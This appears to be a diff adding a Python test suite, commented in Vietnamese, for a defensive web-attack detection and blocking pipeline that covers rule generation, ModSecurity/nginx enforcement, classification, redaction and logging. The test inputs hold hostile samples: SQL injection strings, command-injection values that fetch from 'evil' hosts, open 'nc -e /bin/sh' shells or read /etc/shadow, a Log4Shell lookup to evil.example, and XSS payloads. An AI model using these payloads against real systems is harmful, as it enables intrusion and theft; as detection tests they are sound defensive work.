+    e = web(ip, label, args, status); e["marg_n"] = [n for n, _ in args]; e["marg_v"] = [v for _, v in args]
+    return e
+G.state.clear(); G.state.update({"next_id": G.BASE_ID, "rules": {}})
+sq_m = ["1' union select 1,2-- -", "1' UNION SELECT user,pass-- -", "1' union select null,version()-- -",
+        "1' union  select table_name,2 from dual-- -", "1' union select 3,4-- -", "5' union select a,b#",
+        "9' union/**/select 1,2-- -", "3' union select load_file(0x2f),2-- -"]
+fes.events = [mweb(f"10.10.10.{140 + i}", "sqli", [("id", v)]) for i, v in enumerate(sq_m)] \
+             + [mweb("10.10.10.20", "benign", [("id", "laptop"), ("q", "order by price")])] * 150
+published.clear()
+G.cycle()
+spec_rules = [r for r in G.state["rules"].values() if G.is_spec(r)]
+check("G2r sinh luật đặc tả ở trạng thái shadow", bool(spec_rules) and all(r["state"] == "shadow" for r in spec_rules),
+      str([(r.get("token"), r.get("score")) for r in spec_rules]))
+if spec_rules:
+    r0 = spec_rules[0]
+    check("luật G2r qua kiểm tra tĩnh", G.static_check(r0))
+    check("tệp luật có luật G2r được enforcer chấp nhận", published and F.valid_rules(published[-1]) == 0,
+          published[-1] if published else "")
+    check("luật G2r bắt biến thể chưa thấy", G.rule_hits(r0, {"arg": [], "marg": [("id", "77' union select a,b-- -")]}))
+    check("luật G2r không khớp giá trị lành tính", not G.rule_hits(r0, {"arg": [], "marg": [("id", "laptop")]}))
+
+print("== rulegen: lớp RCE — regex nối-lệnh viết sẵn là ứng viên đặc biệt (phương án A)")
+G.state.clear(); G.state.update({"next_id": G.BASE_ID, "rules": {}})
+rce_m = ["127.0.0.1;cat /etc/passwd", "127.0.0.1;cat /etc/shadow", "127.0.0.1;wget http://evil/x",
+         "127.0.0.1;curl http://evil/s", "127.0.0.1;uname -a", "127.0.0.1;nc -e /bin/sh", "127.0.0.1;bash -i"]
+fes.events = [mweb(f"10.10.10.{150 + i}", "rce", [("ip", v), ("Submit", "Submit")]) for i, v in enumerate(rce_m)] \
+             + [mweb("10.10.10.20", "benign", [("ip", "8.8.8.8"), ("q", "tom & jerry")])] * 150
+published.clear()
+G.cycle()
+rr = [r for r in G.state["rules"].values() if G.is_spec(r) and r["class"] == "rce"]
+check("RCE đa dạng -> luật regex viết sẵn (rx_fixed), đích ARGS:ip",
+      len(rr) == 1 and rr[0]["spec"]["op"] == "rx_fixed" and rr[0]["target"] == "ARGS:ip", str(rr))
+if rr:
+    check("luật regex viết sẵn bắt biến thể ';id' chưa từng thấy",
+          G.rule_hits(rr[0], {"arg": [], "marg": [("ip", "127.0.0.1;id")]}))
+    check("luật regex viết sẵn không khớp giá trị lành tính",
+          not G.rule_hits(rr[0], {"arg": [], "marg": [("ip", "8.8.8.8")]}))
+    check("tệp luật có luật regex viết sẵn được enforcer chấp nhận", published and F.valid_rules(published[-1]) == 0,
+          published[-1] if published else "")
+check("Benign.hit_idx quét thật với regex viết sẵn (không lọc nhanh bằng chuỗi token)",
+      G.M.Benign(["127.0.0.1;id"]).hit_idx(G.RCE_FIXED_SPEC) == {0})
+G.g2r = None
+G.state.clear(); G.state.update({"next_id": G.BASE_ID, "rules": {}})
+G.cycle()
+check("không nạp được G2r -> không sinh luật mới (an toàn khi hỏng)", not G.state["rules"])
+
+# =====================================================================  enforcer
+import enforcer as F
+print("== enforcer: chỉ ghi nội dung đúng định dạng (L10), không áp bản cũ (C11)")
+good = G.render({**ok_rule, "state": "active"}) + "\n" + line + "\n"
+check("tệp luật do rulegen sinh được chấp nhận", F.valid_rules("# generated by rulegen — do not edit\n" + good) == 0)
+check("chỉ thị Apache lạ bị từ chối", F.valid_rules(good + 'LoadModule evil_module /tmp/x.so\n') == 3)
+check("SecRule sai mẫu bị từ chối", F.valid_rules('SecRule REQUEST_URI "@contains /" "id:1,phase:1,deny"\n') == 1)
+written = {}
+F.atomic_write = lambda path, text: written.__setitem__(path, text)
+p = FakeProd()
+F.write_blocklist({"ips": ["10.10.10.66", "khong-phai-ip; }", "10.10.10.66", "2001:db8::1"], "ts": 100.0}, p)
+check("mục không phải IP bị bỏ, IP trùng gộp lại",
+      written[F.MAP_PATH].splitlines()[1:] == ["10.10.10.66 1;", "2001:db8::1 1;"], written.get(F.MAP_PATH))
+F.write_blocklist({"ips": [], "ts": 50.0}, p)
+check("snapshot có ts cũ hơn bị bỏ qua", "10.10.10.66" in written[F.MAP_PATH])
+check("bản tin gửi cùng một key (cùng partition)", all(k == b"blocklist" for _, k, _ in p.msgs))
+
+# =====================================================================  xác thực + nhịp tim + logsink
+print("== common: đăng nhập Kafka và nhịp tim")
+os.environ.pop("KAFKA_USER", None)
+check("không có KAFKA_USER -> không thêm cấu hình SASL", common.kafka_auth() == {})
+os.environ.update({"KAFKA_USER": "responder", "KAFKA_PASSWORD": "bi-mat"})
+ka = common.kafka_auth()
+check("có KAFKA_USER -> SASL/PLAIN đúng tài khoản", ka.get("security.protocol") == "SASL_PLAINTEXT"
+      and ka.get("sasl.mechanism") == "PLAIN" and ka.get("sasl.username") == "responder" and ka.get("sasl.password") == "bi-mat")
+os.environ.pop("KAFKA_USER", None)
+hclock = [5_000_000.0]
+common.time.time = lambda: hclock[0]
+hbuf = FakeBuf(); hbuf.failures = 2; hbuf.buf = [1, 2, 3]
+hb = common.Heartbeat("demo", hbuf, every=30)
+check("chưa tới hạn thì chưa ghi nhịp tim", hb.tick() is None and not hbuf.docs)
+hclock[0] += 6; hb.inc(40)
+d = hb.tick(extra_field=7)
+check("nhịp đầu sau ~5 giây, có đủ số liệu", d is not None and hbuf.docs[-1] is d and d["service"] == "demo"
+      and d["processed"] == 40 and d["es_failures"] == 2 and d["es_buffered"] == 3 and d["extra_field"] == 7, str(d))
+hclock[0] += 10
+check("trong 30 giây kế tiếp không ghi thêm", hb.tick() is None and len(hbuf.docs) == 1)
+hclock[0] += 21; hb.inc(60)
+d = hb.tick()
+check("nhịp kế tiếp tính đúng tốc độ xử lý", d is not None and d["processed"] == 100 and abs(d["rate"] - 60 / 31) < 0.01, str(d))
+hb2 = common.Heartbeat("enforcer", None, every=30); hclock[0] += 6
+d = hb2.tick()
+check("không có bộ đệm ES (enforcer) -> trả bản ghi để gửi qua Kafka", d is not None and "es_failures" not in d)
+
+print("== logsink: gom nhật ký Cổng 1 và error.log (không ghi từng dòng)")
+import logsink as S
+S.gate.clear(); S.errs.clear()
+for i in range(300):
+    S.add_gate({"ts": 1000.0 + i * 0.01, "src_ip": "10.10.10.66", "method": "GET", "uri": f"/scan/{i % 3}.php", "status": 403,
+                "blocked": 1, "ua": "curl/8"}, now=2000.0)
+S.add_gate({"ts": 1001.0, "src_ip": "10.10.10.77", "method": "POST", "uri": "/login.php", "status": 429, "ua": "x"}, now=2000.0)
+S.add_gate({"status": 403}, now=2000.0)
+sbuf = FakeBuf(); S.flush(sbuf, now=2000.0)
+g66 = [d for d in sbuf.docs if d.get("src_ip") == "10.10.10.66"]
+check("300 request của một IP bị chặn -> MỘT bản ghi có count=300", len(g66) == 1 and g66[0]["count"] == 300
+      and g66[0]["reason"] == "blocklist" and g66[0]["uniq_targets"] == 3 and g66[0]["top_target"].startswith("GET /scan/"), str(g66))
+check("429 được ghi là 'limit'; dòng thiếu IP bị bỏ", any(d.get("reason") == "limit" and d["src_ip"] == "10.10.10.77" for d in sbuf.docs)
+      and len(sbuf.docs) == 2)
+check("sau khi ghi, bộ gom được làm rỗng", not S.gate and not S.errs)
+ms = ('[Wed Nov 11 15:23:01.313763 2026] [security2:error] [pid 66:tid 66] [client 172.31.0.5:0] [client 10.10.10.66] '
+      'ModSecurity: Warning. Pattern match "x" at ARGS:id. [file "/a.conf"] [line "7"] [id "942100"] [msg "SQL Injection Attack"] '
+      '[unique_id "%s"]')
+for i in range(40): S.add_err(ms % f"abc{i}", now=3000.0)
+S.add_err("[Wed Nov 11 15:23:02.000001 2026] [php:warn] [pid 70:tid 70] [client 10.10.10.20:51234] PHP Warning:  Undefined variable $x in /var/www/html/a.php on line 12", now=3000.0)
+S.add_err("dòng không theo định dạng nào", now=3000.0)
+S.add_err("", now=3000.0)
+sbuf = FakeBuf(); S.flush(sbuf, now=3000.0)
+m = [d for d in sbuf.docs if d.get("rule_id") == "942100"]
+check("40 dòng ModSecurity cùng luật, cùng IP -> một bản ghi count=40, IP thật, có mã luật", len(m) == 1 and m[0]["count"] == 40
+      and m[0]["src_ip"] == "10.10.10.66" and m[0]["module"] == "security2" and m[0]["message"] == "SQL Injection Attack", str(m))
+ph = [d for d in sbuf.docs if d.get("module") == "php"]
+check("dòng PHP: tách module/mức/IP (bỏ cổng)", len(ph) == 1 and ph[0]["level"] == "warn" and ph[0]["src_ip"] == "10.10.10.20"
+      and "Undefined variable" in ph[0]["message"], str(ph))
+check("dòng sai định dạng vẫn được giữ (level=unknown), dòng rỗng bị bỏ",
+      len(sbuf.docs) == 3 and any(d["level"] == "unknown" for d in sbuf.docs))
+old_max = S.MAX_KEYS; S.MAX_KEYS = 5
+for i in range(50): S.add_gate({"ts": 1.0, "src_ip": f"10.9.0.{i}", "status": 403}, now=1.0)
+check("trần số khoá gom chặn phình bộ nhớ và đếm số bị bỏ", len(S.gate) == 5 and S.dropped["gate"] == 45)
+S.MAX_KEYS = old_max; S.gate.clear()
+
+# =====================================================================  sửa sau rà soát 12/11/2026
+print("== common.EsBuffer: ghi ES ở luồng nền, ES hỏng không chặn vòng lặp (N2)")
+calls = {"n": 0, "fail": True}
+def fake_bulk(client, actions, **kw):
+    calls["n"] += 1
+    if calls["fail"]: raise ConnectionError("ES down")
+    return len(actions), []
+es_mod.helpers.bulk = fake_bulk
+eb = common.EsBuffer(object(), flush_n=3, max_buf=5, start=False)
+import time as _t
+t_add = _t.perf_counter()
+for i in range(4): eb.add("web-events-x", {"i": i})
+check("add() không gọi Elasticsearch (chỉ xếp hàng)", calls["n"] == 0 and len(eb.buf) == 4 and _t.perf_counter() - t_add < 0.05)
+check("ES hỏng: write_once trả False, giữ bản ghi để thử lại", eb.write_once() is False and len(eb.buf) == 4 and eb.failures == 1)
+check("thời gian chờ thử lại tăng dần", eb._backoff == 1.0 and (eb.write_once() is False) and eb._backoff == 2.0)
+for i in range(4, 8): eb.add("web-events-x", {"i": i})
+check("vượt max_buf: bỏ bản CŨ nhất, đếm số bị bỏ", len(eb.buf) == 5 and eb.dropped == 3 and eb.buf[0]["_source"]["i"] == 3,
+      str([a["_source"]["i"] for a in eb.buf]))
+calls["fail"] = False
+check("ES trở lại: ghi hết, bộ đệm rỗng, hết thời gian chờ", eb.write_once() and not eb.buf and eb._backoff == 0.0)
+
+print("== classifier: cảnh báo phát TRƯỚC khi ghi ES (N2)")
+class OrderBuf(FakeBuf):
+    def add(self, idx, doc, _id=None):
+        self.alert_before = bool(C.PROD.msgs); super().add(idx, doc, _id)
+C.ES_BUF, C.PROD = OrderBuf(), FakeProd()
+C.handle_web({"ts_ms": 1794214800000, "src_ip": "10.10.10.66", "method": "GET", "uri": "/x", "query": "?id=1%27+or+%271%27%3D%271",
+              "status": 200, "ua": "curl", "req_id": "O1"})
+check("thông điệp alerts đã gửi khi bản ghi ES được đưa vào bộ đệm", C.PROD.msgs and C.ES_BUF.alert_before)
+
+print("== classifier: tầng 2 chỉ ghi nhận (N1)")
+r = cls("/search", "q=it%27s+ok")
+check("'it's ok' không bị gắn nhãn tấn công", r["label"] == "benign", str(r))
+r = cls("/api/cart", "", '{"items": [{"id": 12, "qty": 2}], "coupon": "SALE10"}')
+check("thân JSON hợp lệ không bị gắn nhãn", r["label"] == "benign", str(r))
+r = cls("/x", "q=%27%29%29+or+sleep%28%29%23")
+check("tấn công tầng 1 bắt được vẫn bị gắn nhãn", r["label"] == "sqli" and r["tier"] == 1, str(r))
+
+print("== classifier: không né được bằng cách đệm (N3)")
+att = "1%27+UNION+SELECT+user%2Cpassword+FROM+users--+-"
+for name, q, b in [("sau 100 tham số đệm", "&".join(f"p{i}=1" for i in range(100)) + "&id=" + att, ""),
+                   ("sau 2048 ký tự đệm", "id=" + "a" * 2048 + att, ""),
+                   ("thân form sau 100 tham số", "", "&".join(f"p{i}=1" for i in range(100)) + "&id=" + att),
+                   ("thân JSON sau 4096 ký tự", "", '{"pad": "' + "a" * 4096 + '", "id": "1\' UNION SELECT user,password FROM users-- -"}')]:
+    r = cls("/item", q, b)
+    check(f"SQLi {name} vẫn bị bắt", r["label"] == "sqli", str(r))
+old = C.SCAN_MAX_BYTES; C.SCAN_MAX_BYTES = 1000
+r = cls("/item", "id=" + "a" * 2000)
+check("vượt trần quét -> nhãn 'uninspected' (không coi là lành tính), độ tin cậy dưới θ",
+      r["label"] == "uninspected" and r["conf"] < 0.9 and r["field"] == "bytes", str(r))
+C.SCAN_MAX_BYTES = old
+old = C.MAX_PARAMS; C.MAX_PARAMS = 10
+check("vượt trần số tham số -> 'uninspected'", cls("/x", "&".join(f"p{i}=1" for i in range(20)))["field"] == "params")
+C.MAX_PARAMS = old
+
+print("== classifier: soi header và cookie (C2)")
+r = C.classify("/", [], [], "${jndi:ldap://evil.example/a}", {"uri": "/", "query": "", "body": ""})
+check("Log4Shell trong User-Agent -> rce", r["label"] == "rce" and r["field"] == "REQUEST_HEADERS:User-Agent", str(r))
+r = C.classify("/", [], [], "Mozilla/5.0", {"uri": "/", "query": "", "body": ""},
+               {"Referer": "http://a/?q=%3Cscript%3Ealert(1)%3C/script%3E"})
+check("XSS trong Referer -> ghi nhận với độ tin cậy dưới θ (nạn nhân XSS phản xạ không bị chặn)",
+      r["label"] == "xss" and r["conf"] < 0.9, str(r))
+r = C.classify("/", [], [], "Mozilla/5.0", {"uri": "/", "query": "", "body": ""},
+               {"cookies": C.cookie_params("security=low; id=1%27%20union%20select%201,2--")})
+check("SQLi trong cookie -> sqli", r["label"] == "sqli" and r["field"] == "REQUEST_COOKIES:id", str(r))
+UAS = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
+       "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
+       "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0 Mobile Safari/537.36",
+       "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0", "curl/8.10.1", "python-requests/2.32.3"]
+check("User-Agent thông thường không bị gắn nhãn",
+      all(C.classify("/", [], [], u, {"uri": "/", "query": "", "body": ""})["label"] == "benign" for u in UAS))
+
+print("== classifier: luật CRLF không soi cấu trúc thân multipart")
+MP = ('--xyzBOUND\r\nContent-Disposition: form-data; name="title"\r\n\r\ngiày thể thao size 42\r\n'
+      '--xyzBOUND\r\nContent-Disposition: form-data; name="uploaded"; filename="anh.jpg"\r\nContent-Type: image/jpeg\r\n\r\n'
+      '\xff\xd8\xff\xe0 JFIF\r\nContent-Type: lẫn trong dữ liệu tệp\r\n\r\n--xyzBOUND--\r\n')
+r = cls("/upload.php", "", MP)
+check("tải tệp hợp lệ (multipart) không bị gắn nhãn crlf", r["label"] != "crlf", str(r))
+MPX = ('--xyzBOUND\r\nContent-Disposition: form-data; name="next"\r\n\r\n/home\r\nSet-Cookie: admin=1\r\n'
+       '--xyzBOUND--\r\n')
+r = cls("/upload.php", "", MPX)
+check("CRLF trong NỘI DUNG một trường văn bản multipart vẫn bị bắt", r["label"] == "crlf", str(r))
+check("multipart_text_values bỏ phần tệp và phần đầu",
+      C.multipart_text_values(MP.lower()) == ["giày thể thao size 42"], str(C.multipart_text_values(MP.lower())))
+
+from urllib.parse import quote_plus
+print("== classifier: javascript:void(0) và recon trên trang có thật")
+for v in ["javascript:void(0)", "javascript:void(0);", "javascript:;", "javascript: void( 0 )"]:
+    r = cls("/x", "ep.link_url=" + quote_plus(v))
+    check(f"{v!r} (liên kết không làm gì) không bị gắn xss", r["label"] != "xss", str(r))
+r = cls("/x", "", '{"destination":"javascript:void(0);","id":""}')
+check("javascript:void(0) trong thân JSON không bị gắn xss", r["label"] != "xss", str(r))
+for v in ["javascript:alert(1)", "javascript:void(0);alert(document.cookie)", "JaVaScRiPt:fetch('//evil')"]:
+    check(f"{v!r} vẫn bị bắt xss", cls("/x", "u=" + quote_plus(v))["label"] == "xss")
+def cls_status(path, status):
+    ev = {"uri": path, "query": "", "body": "", "status": status}
+    return C.classify(C.decode_p(path).lower(), [], [], "Mozilla/5.0", ev)
+r = cls_status("/wp-admin/admin-ajax.php", 200)
+check("recon trên trang CÓ THẬT (200) chỉ ghi nhận (độ tin cậy dưới θ)", r["label"] == "recon" and r["conf"] < 0.9, str(r))
+r = cls_status("/phpmyadmin/", 404)
+check("recon trên tài nguyên không tồn tại (404) vẫn đủ độ tin cậy để chặn", r["label"] == "recon" and r["conf"] >= 0.9, str(r))
+r = C.classify("/wp-admin/", [], [], "sqlmap/1.8", {"uri": "/wp-admin/", "query": "", "body": "", "status": 200})
+check("trang có thật nhưng User-Agent công cụ quét -> scanner (0,9)", r["label"] == "scanner" and r["conf"] >= 0.9, str(r))
+
+print("== classifier: nối lệnh bằng xuống dòng chỉ tính dạng '127.0.0.1\\nid'")
+check("127.0.0.1%0aid -> rce", cls("/vulnerabilities/exec/", "", "ip=127.0.0.1%0aid&Submit=Submit")["label"] == "rce")
+check("127.0.0.1%0a%0dcat /etc/passwd -> rce", cls("/x", "ip=127.0.0.1%0a%0dcat+/etc/passwd")["label"] in ("rce", "lfi"))
+for txt in ["Thú cưng:\ncat and dog", "Ghi chú:\nid card bị mất", "dòng 1\nls là viết tắt của list"]:
+    r = cls("/form", "", "note=" + quote_plus(txt))
+    check(f"ô văn bản nhiều dòng hợp lệ không bị gắn rce: {txt!r}", r["label"] != "rce", str(r))
+r = cls("/api", "", '{\n  "title": "x",\n  "body": "Content-Type: text"\n}')
+check("thân JSON định dạng đẹp không bị luật CRLF", r["label"] != "crlf", str(r))
+
+print("== classifier: che dữ liệu nhạy cảm trước khi lưu (C1)")
+C.ES_BUF, C.PROD = FakeBuf(), FakeProd()
+C.handle_web({"ts_ms": 1794214800000, "src_ip": "10.10.10.20", "method": "POST", "uri": "/login.php", "query": "?token=abc123",
+              "status": 302, "ua": "Mozilla/5.0", "req_id": "S1", "ct": "application/x-www-form-urlencoded", "cl": "60",
+              "cookie": "PHPSESSID=s3cr3tsess; security=low"})
+C.handle_audit({"transaction": {"transaction_id": "S1"}, "request": {"body": ["username=admin&password=Hunter2%21&Login=Login"]}})
+d = C.ES_BUF.docs[-1]
+blob = json.dumps(d)
+check("mật khẩu, token, mã phiên không còn trong bản ghi ES", "Hunter2" not in blob and "hunter2" not in blob
+      and "abc123" not in blob and "s3cr3tsess" not in blob, blob[:300])
+check("tên tham số và giá trị không nhạy cảm vẫn giữ", "username" in d["arg_n"] and "admin" in d["arg_v"]
+      and d["cookie_n"] == ["phpsessid", "security"], str((d["arg_n"], d["arg_v"], d.get("cookie_n"))))
+check("che trong JSON / XML / multipart", "x1y2" not in C.redact_text('{"user": "a", "password": "x1y2"}')
+      and "x1y2" not in C.redact_text("<r><pass>x1y2</pass></r>")
+      and "x1y2" not in C.redact_text('--b\r\nContent-Disposition: form-data; name="password"\r\n\r\nx1y2\r\n--b--'))
+nb, npd = FakeBuf(), FakeProd()
+C.handle_net({"event_type": "http", "timestamp": "2026-11-09T09:00:00.000000+0000", "src_ip": "10.10.10.66",
+              "dest_ip": "10.10.10.10", "http": {"url": "/index.php?api_token=S3cret-123&q=laptop", "http_method": "GET",
+              "status": 200, "http_user_agent": "Mozilla/5.0"}}, nb, npd)
+check("sự kiện HTTP của Suricata: token trong query bị che (C1, kịch bản 29)",
+      nb.docs and "s3cret-123" not in json.dumps(nb.docs[-1]).lower() and "q=laptop" in nb.docs[-1]["target"],
+      str(nb.docs[-1] if nb.docs else None))
+
+print("== classifier: thân bị ModSecurity cắt (C7) và request không có thân (T13)")
+C.ES_BUF, C.PROD = FakeBuf(), FakeProd()
+C.handle_web({"ts_ms": 1794214800000, "src_ip": "10.10.10.66", "method": "POST", "uri": "/collect", "query": "", "status": 200,
+              "ua": "x", "req_id": "T1", "ct": "application/octet-stream", "cl": "1346"})
+C.handle_audit({"transaction": {"transaction_id": "T1"},
+                "request": {"body": ["\x1f\x8b\x08"], "headers": {"Content-Length": "1346", "Content-Type": "application/octet-stream"}}})
+d = C.ES_BUF.docs[-1]
+check("thân chỉ còn 3/1346 byte -> 'uninspected', body_truncated", d["label"] == "uninspected" and d.get("body_truncated"), str(d)[:200])
+C.ES_BUF, C.PROD = FakeBuf(), FakeProd()
+C.handle_web({"ts_ms": 1794214800000, "src_ip": "10.10.10.66", "method": "POST", "uri": "/logout", "query": "", "status": 302,
+              "ua": "x", "req_id": "T2", "ct": "-", "cl": "-", "te": "-"})
+check("POST không có Content-Length -> phân loại ngay, không chờ 15 giây", C.ES_BUF.docs and "T2" not in C.PENDING)
+C.ES_BUF, C.PROD = FakeBuf(), FakeProd()
+C.handle_web({"ts_ms": 1794214800000, "src_ip": "10.10.10.66", "method": "POST", "uri": "/x", "query": "", "status": 200,
+              "ua": "x", "req_id": "T3", "ct": "-", "cl": "-", "te": "chunked"})
+check("POST chunked (không có Content-Length) vẫn chờ thân", "T3" in C.PENDING)
+C.PENDING.clear()
+old = C.PENDING_MAX; C.PENDING_MAX = 3
+for i in range(6):
+    C.handle_web({"ts_ms": 1794214800000, "src_ip": "10.10.10.66", "method": "POST", "uri": "/x", "query": "", "status": 200,
+                  "ua": "x", "req_id": f"P{i}", "ct": "a/b", "cl": "5"})
+check("hàng chờ có trần: mục cũ nhất được phân loại không thân, không mất", len(C.PENDING) == 3 and C.DROPPED["pending"] >= 3)
+C.PENDING_MAX = old; C.PENDING.clear()
+
+print("== responder: IP dùng chung -> chặn theo (IP, User-Agent) (D1)")
+R.time.time = lambda: clock[0]          # phần nhịp tim ở trên đã thay đồng hồ chung của module time
+R.prod = FakeProd()
+R.decide({"kind": "ip_profile", "src_ip": "10.10.10.150", "uas": 6, "ts": clock[0], "confidence": 0})
+check("tier3 báo IP dùng chung -> ghi nhận", R.is_shared("10.10.10.150", clock[0]))
+for i in range(5):
+    d = alert("10.10.10.150", target=f"/a?id={i}", ua="sqlmap/1.8"); clock[0] += 1
+check("đủ ngưỡng -> chặn khoá (IP, User-Agent), không chặn cả IP", d["decision"] == "block" and d.get("scope") == "fingerprint"
+      and d.get("fp_ua") == "sqlmap/1.8" and "10.10.10.150" not in R.state["blocks"], str(d))
+snap = R.prod.msgs[-1][2]
+check("snapshot gửi enforcer có fps", ["10.10.10.150", "sqlmap/1.8"] in snap["fps"] and "10.10.10.150" not in snap["ips"], str(snap))
+d = alert("10.10.10.150", target="/b?id=9", ua="Mozilla/5.0 (người dùng khác)")
+check("người dùng khác sau cùng NAT chỉ bị đếm, không bị chặn", d["decision"] == "count", str(d))
+for k in range(2):
+    for i in range(5):
+        d = alert("10.10.10.150", target=f"/c{k}?id={i}", ua=f"tool-{k}"); clock[0] += 1
+check(f"đổi User-Agent liên tục: đủ {R.SHARED_ESCALATE} dấu vân tay bị chặn -> chặn cả IP",
+      R.state["blocks"].get("10.10.10.150", {}).get("active") and d["decision"] == "block", str(d))
+R.control({"cmd": "unblock", "ip": "10.10.10.150", "id": "u1", "ts": clock[0]})
+check("gỡ chặn một IP gỡ cả các dấu vân tay của IP đó", not any(k.startswith("10.10.10.150") for k in R.state["blocks"]))
+d = alert("10.10.10.151", target="/a?id=1", ua='bad"ua')
+check("IP không phải dùng chung: vẫn chặn/đếm theo IP như cũ", d.get("scope") is None)
+
+print("== enforcer: ghi blockfp.map cho dấu vân tay (D1)")
+written.clear()
+F.last_ts["blocklist"] = 0.0
+F.write_blocklist({"ips": ["10.10.10.66"], "fps": [["10.10.10.5", "curl/8.1"], ["10.10.10.6", 'x" 1; }'],
+                                                     ["khong-phai-ip", "a"]], "ts": 999.0}, FakeProd())
+fp_lines = written[F.FP_PATH].splitlines()[1:]
+check("chỉ dấu vân tay hợp lệ được ghi, đúng cú pháp map của nginx", fp_lines == ['"10.10.10.5|curl/8.1" 1;'], str(fp_lines))
+
+print("== tier3: mẫu 'denied' không chặn người dùng gửi lại một form bị CRS chặn nhầm (C4)")
+m = run_tier3([("/contact.php", 403, "POST", "")] * 12 + [("/", 200, "GET", "")] * 4)
+check("12 lần 403 trên MỘT đường dẫn -> không báo", not [x for x in m if x[2].get("immediate")], str(m[:1]))
+m = run_tier3([(f"/p{i % 4}.php", 403, "GET", "?id=1'") for i in range(16)])
+check("403 dồn dập trên nhiều đường dẫn -> 'denied'", m and m[0][2]["shape"] == "denied", str(m[:1]))
+m = run_tier3([("/vulnerabilities/sqli/", 403, "GET", f"?id={i}'") for i in range(40)])
+check("dò một tham số rất dày (40 lần 403) -> vẫn 'denied'", m and m[0][2]["shape"] == "denied", str(m[:1]))
+saved = T.M; T.M = None
+m = run_tier3([(f"/secret_{i}.php", 404, "GET", "") for i in range(40)])
+check("không có model: vẫn phát hiện bằng cổng định hình (không đứng yên)", m and m[0][2]["shape"] == "recon", str(m[:1]))
+T.M = saved
+T.st.clear(); buf, prod = FakeBuf(), FakeProd()
+T.time.time = lambda: 3_000_010.0
+for i in range(20):
+    T.add({"src_ip": "10.10.10.160", "ts_ms": (3_000_000 + i * 0.3) * 1000, "uri": "/", "status": 200, "method": "GET",
+           "query": "", "ua": f"Browser/{i % 5}"}, prod, buf)
+check("5 User-Agent khác nhau trong cửa sổ -> báo responder IP dùng chung", any(x[2].get("kind") == "ip_profile" for x in prod.msgs))
+
+print("== logsink: request dị dạng bị nginx từ chối được ghi (C5)")
+S.gate.clear()
+S.add_gate({"ts": 1.0, "src_ip": "10.10.10.66", "status": 414, "blocked": 0, "request": "GET /aaaa"}, now=1.0)
+S.add_gate({"ts": 1.0, "src_ip": "10.10.10.67", "status": 403, "blocked": 1, "fp_blocked": 1}, now=1.0)
+sbuf = FakeBuf(); S.flush(sbuf, now=2.0)
+check("414 -> reason 'rejected' kèm dòng request", any(d["reason"] == "rejected" and d["status"] == 414 and d.get("request") for d in sbuf.docs))
+check("403 do dấu vân tay -> reason 'fingerprint'", any(d["reason"] == "fingerprint" for d in sbuf.docs))
+
+print("== Cổng 2: luật tầng 1 đồng bộ khớp mã nguồn classifier")
+import subprocess
+_g = subprocess.run([sys.executable, "-X", "utf8", "-B", os.path.join(ROOT, "tools", "gen_tier1_modsec.py"), "--check"],
+                    capture_output=True, text=True, encoding="utf-8")
+check("web/apache/nsm-tier1.conf được sinh lại sau khi sửa regex tầng 1", _g.returncode == 0, _g.stderr.strip())
+_t1 = open(os.path.join(ROOT, "web", "apache", "nsm-tier1.conf"), encoding="utf-8").read()
+_ids = [int(x) for x in re.findall(r"\bid:(\d+)", _t1)]
+check("id luật tầng 1 đồng bộ nằm trong dải 1000200–1000399, không trùng",
+      _ids and all(1000200 <= i < 1000400 for i in _ids) and len(_ids) == len(set(_ids)), str(_ids[:5]))
+check("mọi lớp tầng 1 chặn chắc chắn đều có luật đồng bộ",
+      {c for c, _p, sc in C._RULES if sc != "redirect"} | {"scanner"}
+      == set(re.findall(r"tag:'nsm/tier1/(\w+)'", _t1)))
+check("Referer / open redirect (chỉ ghi nhận) không bị chặn đồng bộ",
+      "Referer" not in _t1 and "nsm/tier1/redirect" not in _t1)
+_za = open(os.path.join(ROOT, "web", "apache", "zz-autogen.conf"), encoding="utf-8").read()
+check("luật đồng bộ nạp SAU luật tự sinh",
+      0 <= _za.find("autogen/active.conf") < _za.find("nsm-sync/tier1.conf"))
+
+print()
+if FAILS:
+    print(f"THẤT BẠI {len(FAILS)} mục:"); [print("  -", f) for f in FAILS]; sys.exit(1)
+print("TẤT CẢ ĐỀU ĐẠT")
